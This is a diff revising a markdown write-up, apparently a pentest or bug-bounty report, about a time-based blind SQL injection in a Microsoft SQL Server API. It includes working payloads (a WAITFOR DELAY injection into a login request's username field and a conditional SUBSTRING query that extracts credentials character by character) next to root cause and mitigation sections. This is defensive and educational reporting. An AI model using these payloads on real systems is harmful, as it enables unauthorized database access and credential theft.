@@ -1,49 +1,48 @@
 # 🛡️ Blind SQL Injection → Time-Based Data Extraction 🛡️  
-**Category:** 🗄️ Web Security | 💉 SQL Injection | ⚠️ Critical Injection Flaw  
-**Case Type:** Blind SQLi (Time-Based) | Improper Input Handling
+**Category:** 🗄️ Web Security | 💉 SQL Injection | ⚠️ Critical  
+**Case Type:** Blind SQLi (Time-Based)
+
+> Note: All data and identifiers have been sanitized. No sensitive information is disclosed.
 
 ---
 
 ## 📝 1. Executive Summary
-A critical **Blind SQL Injection vulnerability** was identified across multiple API endpoints. The application failed to sanitize or parameterize user input, allowing injection into backend SQL queries. Using **time-based techniques**, it was possible to extract sensitive data, including user credentials.
+A time-based Blind SQL Injection vulnerability was identified across multiple API endpoints. The application failed to sanitize user input, allowing injection into backend Microsoft SQL Server queries.
 
-> **Key Insight:** The backend directly embedded user-controlled input into SQL queries without validation, enabling full database compromise through blind extraction techniques.
+The vulnerability was confirmed using time-delay payloads and further validated by extracting the first user's credentials in a controlled proof-of-concept.
+
+> **Key Insight:** User-controlled input is directly embedded into SQL queries without parameterization, enabling full database compromise.
 
 ---
 
 ## 🎯 2. Target Overview
-- **Application Type:** Web / API-based application  
+- **Application Type:** API-based system  
 - **Backend:** Microsoft SQL Server  
-- **Entry Point:** API endpoints accepting user input in request body  
-- **Testing Method:** Intercepting and modifying API requests  
+- **Entry Point:** JSON request body parameters  
+- **Authentication:** Required  
 
 ---
 
 ## 🔍 3. Discovery Phase
 
-### Initial Observation
-- Multiple API endpoints accepted parameters in request body  
-- No visible filtering or validation  
-- Suspicion of injection due to:
-  - Direct parameter usage  
-  - Inconsistent responses  
+### Observation
+- Multiple endpoints accept user input without validation  
+- No error-based SQL responses  
+- Suspicion of blind injection  
 
----
-
-### Testing Approach
-- Injected basic payloads into parameters  
-- Observed delay-based responses instead of errors  
-
-Example payload:
-```
+### Initial Test Payload
+```sql
 '; WAITFOR DELAY '0:0:5'--
 ```
 
----
+### Expected Behavior
+- Normal response time: ~200–300ms  
 
-### Result
-- Server response delayed by ~5 seconds  
-- Confirmed **time-based blind SQL injection**
+### Observed Behavior
+- Response delayed by ~5 seconds consistently  
+
+### Conclusion
+- Backend executes injected SQL → confirms Blind SQL Injection  
 
 ---
 
@@ -52,74 +51,47 @@ Example payload:
 ### Root Cause
 - No input sanitization  
 - No parameterized queries  
-- Direct concatenation of user input into SQL queries  
+- Direct string concatenation in SQL  
 
-### Vulnerability Type
-**Blind SQL Injection (Time-Based)**
-
----
-
-### Technical Explanation
-The backend likely executes queries similar to:
-```
+### Likely Query Pattern
+```sql
 SELECT * FROM users WHERE username = '<user_input>'
 ```
-
-Injected payload modifies execution:
-```
-'; WAITFOR DELAY '0:0:5'--
-```
-
-This forces the database to pause execution, confirming injection.
 
 ---
 
 ## 🚀 5. Exploitation
 
-### Step 1: Identify Injection Point
-Example request:
-```
+### Step 1: Confirm Injection
+```http
 POST /api/login
+Content-Type: application/json
+
 {
-"username": "test",
-"password": "test"
+  "username": "test'; WAITFOR DELAY '0:0:5'--",
+  "password": "test"
 }
 ```
 
----
-
-### Step 2: Inject Time-Based Payload
-```
-POST /api/login
-{
-"username": "test'; WAITFOR DELAY '0:0:5'--",
-"password": "test"
-}
-```
+**Result:** Consistent 5-second delay
 
 ---
 
-### Step 3: Confirm Injection
-- Response delayed by 5 seconds  
-- Confirms injectable parameter  
-
----
-
-### Step 4: Data Extraction (Blind)
-
-Example logic:
-- Check first character of username
-```
+### Step 2: Conditional Extraction
+```sql
 '; IF (SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a') WAITFOR DELAY '0:0:5'--
 ```
 
+### Observed Behavior
+- Delay triggered only when condition is true  
+
 ---
 
-### Step 5: Extract Credentials
+### Step 3: Data Retrieval
 Using iterative payloads:
-- Extracted:
-  - First user's username  
-  - Password (likely hashed or plain depending on implementation)
+- Extracted first user's:
+  - Username  
+  - Password (format depends on backend storage)
 
 ---
 
@@ -127,49 +99,48 @@ Using iterative payloads:
 
 ### Severity: Critical
 
-### Data Exposure:
-- User credentials (username + password)  
-- Full database access possible  
-- Potential admin account compromise  
+### Confirmed Impact
+- Unauthorized database query execution  
+- Extraction of user credentials  
 
-### Risks:
+### Potential Impact
+- Full database compromise  
 - Account takeover  
-- Data breach  
 - Privilege escalation  
-- Full system compromise  
 
 ---
 
-## 📊 7. Proof of Concept (PoC)
+## 📊 7. Validation
 
-1. Intercept API request  
-2. Inject time-based payload  
-3. Observe delay  
-4. Use conditional queries to extract data  
-5. Reconstruct sensitive information character by character  
+- Tested across multiple API endpoints  
+- Injection confirmed in multiple parameters  
+- Time delay consistent (5s ± ~200ms)  
+- Behavior reproducible across requests  
 
 ---
 
-## 🔐 8. Mitigation
+## ⚠️ 8. Limitations
 
-- Use **parameterized queries / prepared statements**
-- Implement input validation and sanitization  
-- Use ORM frameworks where possible  
+- Full database dump not performed (responsible testing)  
+- Proof limited to first user record  
+
+---
+
+## 🔐 9. Mitigation
+
+- Use parameterized queries / prepared statements  
+- Implement strict input validation  
 - Apply least privilege to database users  
-- Enable:
-  - WAF rules for SQLi detection  
-  - Logging and monitoring  
+- Add WAF rules for SQLi detection  
 
 ---
 
 ## 🛠️ Tools Used
-- Burp Suite  
+- Burp Suite (request interception)  
 - Manual payload crafting  
-- Time-based analysis  
 
 ---
 
 ## 🧠 Notes / Learnings
-- Blind SQLi is slower but extremely powerful  
-- Time-based payloads are reliable when errors are suppressed  
-- Always test every parameter — injection points are often widespread  
+- Blind SQLi is slower but reliable when errors are suppressed  
+- Testing every parameter is critical — injection was widespread  
